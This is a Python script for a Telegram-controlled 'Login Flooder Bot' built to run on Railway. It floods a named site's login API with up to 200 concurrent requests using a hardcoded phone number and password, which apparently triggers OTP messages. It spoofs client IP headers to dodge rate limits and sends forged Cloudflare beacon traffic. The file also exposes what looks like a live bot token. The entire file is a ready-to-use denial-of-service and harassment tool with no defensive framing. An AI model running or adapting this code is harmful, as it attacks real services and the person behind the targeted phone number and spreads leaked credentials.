#!/usr/bin/env python3
"""
🔥 LOGIN FLOODER BOT – Railway Edition
- IP Spoofing + Cloudflare Beacon
- Telegram bot control (start/stop/status/settings)
- Web server for Railway health checks
"""

import asyncio
import aiohttp
import time
import os
import signal
import sys
import logging
import random
import string
import json
from urllib.parse import urlparse
from aiohttp import web

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ─── LOGGING ──────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ─── TELEGRAM CONFIG ──────────────────────────────────────
BOT_TOKEN = "8802900336:AAH-kjC7LYFHu60nAkKfSCZqc28AiRrB89M"   # Replace with your bot token
ADMIN_ID = 8401097557  # Your Telegram user ID

# ─── TARGET CONFIG (LOGIN) ──────────────────────────────
LOGIN_URL = "https://rupixwallet.shop/api/auth/login"
PHONE = "9359202967"
PASSWORD = "1234567Sv#"

# ─── CLOUDFLARE BEACON ──────────────────────────────────
BEACON_URL = "https://performance.radar.cloudflare.com/api/beacon"

# ─── FLOODER CONFIG ──────────────────────────────────────
BATCH_SIZE = 200                # Requests per batch
CONCURRENT_LIMIT = 200         # Concurrent connections
REQUEST_DELAY = 0.2            # Delay between spawning requests
MAX_RETRIES = 0                # Retry on failure
MAX_USAGE_PER_IP = 15          # Reuse successful IP this many times
TIMEOUT = 10                   # Request timeout

# ─── SHARED STATE ─────────────────────────────────────────
flooder_running = False
flooder_task = None
ip_pool = {}                   # {ip: usage_count}
stats = {'sent': 0, 'ok': 0, 'fail': 0, 'blocked': 0, 'retries': 0, 'beacon_ok': 0, 'beacon_sent': 0}
stats_lock = asyncio.Lock()
ip_lock = asyncio.Lock()
start_time = 0
last_report_time = 0

# ─── HELPERS ──────────────────────────────────────────────
def random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"

def get_spoof_ip():
    if ip_pool:
        return random.choice(list(ip_pool.keys()))
    return random_ip()

def generate_token():
    ts = int(time.time() * 1000)
    rnd = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
    return f"{ts}-{rnd}"

def get_android_user_agents():
    return [
        "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.111 Mobile Safari/537.36",
    ]

def get_beacon_payload():
    ts = int(time.time() * 1000)
    return {
        "sessionTimeMs": ts,
        "triggerCode": 1015,
        "measurements": [{
            "targetEntity": "cdn-cloudflare-ps",
            "preWarmedRequest": False,
            "transferSize": 130398,
            "failure": False,
            "targetObjectHash": "27bce9e85eaf3567a4695ba2b612e32615394d80d0a3a2dcb07b1fbfdfababc7",
            "instanceTimeMs": ts - 1000,
            "domainLookupStart": random.uniform(100, 200),
            "domainLookupEnd": random.uniform(100, 200),
            "connectStart": random.uniform(100, 200),
            "connectEnd": random.uniform(200, 300),
            "connectSecureStart": random.uniform(150, 250),
            "responseStart": random.uniform(300, 400),
            "requestStart": random.uniform(200, 300),
            "responseEnd": random.uniform(400, 500),
            "encodedBodySize": 102400,
            "decodedBodySize": 102400,
            "connectProtocol": "http/2"
        }]
    }

async def send_beacon(session, spoof_ip, origin):
    try:
        token = generate_token()
        payload = get_beacon_payload()
        headers = {
            "host": "performance.radar.cloudflare.com",
            "sec-ch-ua-platform": '"Android"',
            "user-agent": random.choice(get_android_user_agents()),
            "x-submit-token": token,
            "sec-ch-ua": '"Google Chrome";v="120", "Chromium";v="120", "Not=A?Brand";v="99"',
            "content-type": "application/json;charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "accept": "*/*",
            "origin": origin,
            "x-requested-with": "XMLHttpRequest",
            "sec-fetch-site": "cross-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "X-Forwarded-For": spoof_ip,
            "X-Real-IP": spoof_ip,
        }
        async with session.post(BEACON_URL, headers=headers, json=payload, timeout=5) as resp:
            async with stats_lock:
                stats['beacon_sent'] += 1
                if resp.status == 200:
                    stats['beacon_ok'] += 1
    except:
        pass

# ─── REQUEST WORKER (LOGIN) ──────────────────────────────
async def send_login(session, retry_count=0):
    async with ip_lock:
        spoof_ip = get_spoof_ip()
    parsed = urlparse(LOGIN_URL)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    # Fire-and-forget beacon
    asyncio.create_task(send_beacon(session, spoof_ip, origin))

    headers = {
        "host": parsed.netloc,
        "sec-ch-ua-platform": "Android",
        "user-agent": random.choice(get_android_user_agents()),
        "sec-ch-ua": '"Not=A?Brand";v="99", "Android WebView";v="151", "Chromium";v="151"',
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "accept": "*/*",
        "origin": origin,
        "x-requested-with": "com.mycompany.app.soulbrowser",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": f"{origin}/login",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-IN,en-US;q=0.9,en;q=0.8",
        "X-Forwarded-For": spoof_ip,
        "X-Real-IP": spoof_ip,
        "X-Originating-IP": spoof_ip,
        "Forwarded": f"for={spoof_ip};proto=https",
        "Client-IP": spoof_ip,
        "X-Proxy-IP": spoof_ip,
        "True-Client-IP": spoof_ip,
    }
    payload = {"phone": PHONE, "password": PASSWORD}

    try:
        timeout = aiohttp.ClientTimeout(total=TIMEOUT, connect=5)
        async with session.post(LOGIN_URL, json=payload, headers=headers, ssl=False, timeout=timeout) as resp:
            status = resp.status
            text = await resp.text()
            async with stats_lock:
                stats['sent'] += 1

            if status == 200:
                try:
                    data = json.loads(text)
                    if data.get("success") and data.get("requiresOtp"):
                        async with ip_lock:
                            if spoof_ip in ip_pool:
                                ip_pool[spoof_ip] += 1
                                if ip_pool[spoof_ip] >= MAX_USAGE_PER_IP:
                                    del ip_pool[spoof_ip]
                            else:
                                ip_pool[spoof_ip] = 1
                        async with stats_lock:
                            stats['ok'] += 1
                        return True
                    else:
                        # Login refused (wrong creds, account issue)
                        if retry_count < MAX_RETRIES:
                            async with stats_lock:
                                stats['retries'] += 1
                            await asyncio.sleep(1)
                            return await send_login(session, retry_count + 1)
                        else:
                            async with ip_lock:
                                if spoof_ip in ip_pool:
                                    del ip_pool[spoof_ip]
                            async with stats_lock:
                                stats['fail'] += 1
                            return False
                except json.JSONDecodeError:
                    if retry_count < MAX_RETRIES:
                        async with stats_lock:
                            stats['retries'] += 1
                        await asyncio.sleep(1)
                        return await send_login(session, retry_count + 1)
                    else:
                        async with ip_lock:
                            if spoof_ip in ip_pool:
                                del ip_pool[spoof_ip]
                        async with stats_lock:
                            stats['fail'] += 1
                        return False
            elif status in (403, 429, 503, 500):
                if retry_count < MAX_RETRIES:
                    async with stats_lock:
                        stats['retries'] += 1
                    await asyncio.sleep(2 ** retry_count)
                    return await send_login(session, retry_count + 1)
                else:
                    async with ip_lock:
                        if spoof_ip in ip_pool:
                            del ip_pool[spoof_ip]
                    async with stats_lock:
                        stats['fail'] += 1
                        stats['blocked'] += 1
                    return False
            else:
                if retry_count < MAX_RETRIES:
                    async with stats_lock:
                        stats['retries'] += 1
                    await asyncio.sleep(1)
                    return await send_login(session, retry_count + 1)
                else:
                    async with ip_lock:
                        if spoof_ip in ip_pool:
                            del ip_pool[spoof_ip]
                    async with stats_lock:
                        stats['fail'] += 1
                    return False
    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
        if retry_count < MAX_RETRIES:
            async with stats_lock:
                stats['retries'] += 1
            await asyncio.sleep(2 ** retry_count)
            return await send_login(session, retry_count + 1)
        else:
            async with ip_lock:
                if spoof_ip in ip_pool:
                    del ip_pool[spoof_ip]
            async with stats_lock:
                stats['sent'] += 1
                stats['fail'] += 1
            return False
    except Exception:
        async with ip_lock:
            if spoof_ip in ip_pool:
                del ip_pool[spoof_ip]
        async with stats_lock:
            stats['sent'] += 1
            stats['fail'] += 1
        return False

# ─── FLOODER LOOP ─────────────────────────────────────────
async def flooder_loop():
    global flooder_running
    logger.info("🔥 Login Flooder started")
    connector = aiohttp.TCPConnector(
        limit=CONCURRENT_LIMIT,
        limit_per_host=CONCURRENT_LIMIT,
        force_close=True,
        enable_cleanup_closed=True,
        ttl_dns_cache=300,
        ssl=False
    )
    async with aiohttp.ClientSession(connector=connector) as session:
        while flooder_running:
            try:
                tasks = []
                for _ in range(BATCH_SIZE):
                    if not flooder_running:
                        break
                    task = asyncio.create_task(send_login(session))
                    tasks.append(task)
                    await asyncio.sleep(REQUEST_DELAY)
                if tasks:
                    await asyncio.gather(*tasks, return_exceptions=True)
                if flooder_running:
                    await asyncio.sleep(0.5)
            except Exception as e:
                logger.error(f"Flooder loop error: {e}")
                await asyncio.sleep(1)
    logger.info("Flooder stopped.")

# ─── TELEGRAM BOT ──────────────────────────────────────────
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    keyboard = [
        [InlineKeyboardButton("⚡ Start Flood", callback_data="startflood")],
        [InlineKeyboardButton("🛑 Stop Flood", callback_data="stopflood")],
        [InlineKeyboardButton("📊 Status", callback_data="status")],
        [InlineKeyboardButton("⚙️ Settings", callback_data="settings")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    msg = (
        "🔥 **Login Flooder Bot**\n"
        "🛡️ IP Spoofing + Cloudflare Bypass\n"
        f"👤 Phone: `{PHONE}`\n"
        "📌 Railway Optimized\n\n"
        "Use buttons below to control:"
    )
    await update.message.reply_text(msg, reply_markup=reply_markup)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if update.effective_user.id != ADMIN_ID:
        await query.edit_message_text("⛔ Unauthorized.")
        return
    action = query.data
    if action == "startflood":
        await start_flooder(update, context, query)
    elif action == "stopflood":
        await stop_flooder(update, context, query)
    elif action == "status":
        await show_status(update, context, query)
    elif action == "settings":
        await show_settings(update, context, query)

async def start_flooder(update, context, query=None):
    global flooder_running, flooder_task, start_time, stats
    if flooder_running:
        msg = "⚠️ Flooder already running."
        if query: await query.edit_message_text(msg)
        else: await update.message.reply_text(msg)
        return
    flooder_running = True
    start_time = time.time()
    async with stats_lock:
        stats = {'sent':0,'ok':0,'fail':0,'blocked':0,'retries':0,'beacon_ok':0,'beacon_sent':0}
    flooder_task = asyncio.create_task(flooder_loop())
    msg = "▶️ Flooder started successfully!"
    if query: await query.edit_message_text(msg)
    else: await update.message.reply_text(msg)

async def stop_flooder(update, context, query=None):
    global flooder_running
    if not flooder_running:
        msg = "⚠️ Flooder already stopped."
        if query: await query.edit_message_text(msg)
        else: await update.message.reply_text(msg)
        return
    flooder_running = False
    if flooder_task:
        flooder_task.cancel()
    msg = "🛑 Flooder stopped."
    if query: await query.edit_message_text(msg)
    else: await update.message.reply_text(msg)

async def show_status(update, context, query=None):
    elapsed = time.time() - start_time if start_time else 0
    async with stats_lock:
        s = stats['sent']; o = stats['ok']; f = stats['fail']; b = stats['blocked']; r = stats['retries']; bo = stats['beacon_ok']; bs = stats['beacon_sent']
    rate = s / elapsed if elapsed > 0 else 0
    ok_pct = (o / s * 100) if s > 0 else 0
    async with ip_lock: pool_size = len(ip_pool)
    msg = (
        f"📊 **Live Stats**\n\n"
        f"📤 Sent: {s:,}\n"
        f"✅ OK: {o:,} ({ok_pct:.1f}%)\n"
        f"❌ Errors: {f:,}\n"
        f"🚫 Blocked: {b:,}\n"
        f"🔄 Retries: {r:,}\n"
        f"📡 Beacon: {bo}/{bs}\n"
        f"⚡ Rate: {rate:.1f} req/s\n"
        f"🌐 IP Pool: {pool_size}\n"
        f"🕒 Uptime: {int(elapsed)}s\n"
        f"🔄 Running: {'✅ Yes' if flooder_running else '❌ No'}"
    )
    if query: await query.edit_message_text(msg)
    else: await update.message.reply_text(msg)

async def show_settings(update, context, query=None):
    msg = (
        f"⚙️ **Current Settings**\n\n"
        f"📦 Batch Size: {BATCH_SIZE}\n"
        f"⏱️ Timeout: {TIMEOUT}s\n"
        f"⚡ Concurrent Limit: {CONCURRENT_LIMIT}\n"
        f"🔄 Max IP Usage: {MAX_USAGE_PER_IP}\n"
        f"🔄 Retries: {MAX_RETRIES}\n"
        f"⏳ Request Delay: {REQUEST_DELAY}s\n"
        f"👤 Phone: `{PHONE}`"
    )
    if query: await query.edit_message_text(msg)
    else: await update.message.reply_text(msg)

# ─── AUTO REPORT ──────────────────────────────────────────
async def auto_report(context: ContextTypes.DEFAULT_TYPE):
    global last_report_time
    if not flooder_running: return
    now = time.time()
    if now - last_report_time < 30: return
    last_report_time = now
    elapsed = now - start_time
    async with stats_lock:
        s = stats['sent']; o = stats['ok']; f = stats['fail']; b = stats['blocked']
    rate = s / elapsed if elapsed > 0 else 0
    msg = f"📊 **Auto Report**\n\n📤 Sent: {s:,}\n✅ OK: {o:,}\n❌ Errors: {f:,}\n🚫 Blocked: {b:,}\n⚡ Rate: {rate:.1f} req/s"
    try:
        await context.bot.send_message(chat_id=ADMIN_ID, text=msg)
    except: pass

# ─── HEALTH CHECK WEB SERVER ──────────────────────────────
async def health(request):
    return web.Response(text="✅ Login Flooder Bot Online", status=200)

async def run_webserver():
    app = web.Application()
    app.router.add_get('/', health)
    app.router.add_get('/health', health)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.getenv("PORT", "8080"))
    site = web.TCPSite(runner, host='0.0.0.0', port=port)
    await site.start()
    logger.info(f"🌐 Web server started on port {port}")
    while True:
        await asyncio.sleep(60)

# ─── MAIN ──────────────────────────────────────────────────
async def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("status", show_status))
    app.add_handler(CommandHandler("startflood", start_flooder))
    app.add_handler(CommandHandler("stopflood", stop_flooder))
    app.add_handler(CommandHandler("settings", show_settings))
    app.add_handler(CallbackQueryHandler(button_handler))

    job_queue = app.job_queue
    if job_queue:
        job_queue.run_repeating(auto_report, interval=30, first=10)

    try:
        await app.bot.send_message(
            chat_id=ADMIN_ID,
            text="🔥 **Login Flooder Bot Online**\n🛡️ IP Spoofing + Cloudflare Bypass\n📌 Railway Ready\n\n/start for commands"
        )
    except Exception as e:
        logger.error(f"Startup message failed: {e}")

    await app.initialize()
    await app.start()
    await app.updater.start_polling()

    try:
        await asyncio.gather(
            run_webserver(),
            asyncio.Event().wait()
        )
    except asyncio.CancelledError:
        pass
    finally:
        await app.updater.stop()
        await app.stop()

if __name__ == "__main__":
    def signal_handler(sig, frame):
        logger.info("🛑 Shutting down...")
        sys.exit(0)
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Exiting.")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        sys.exit(1)
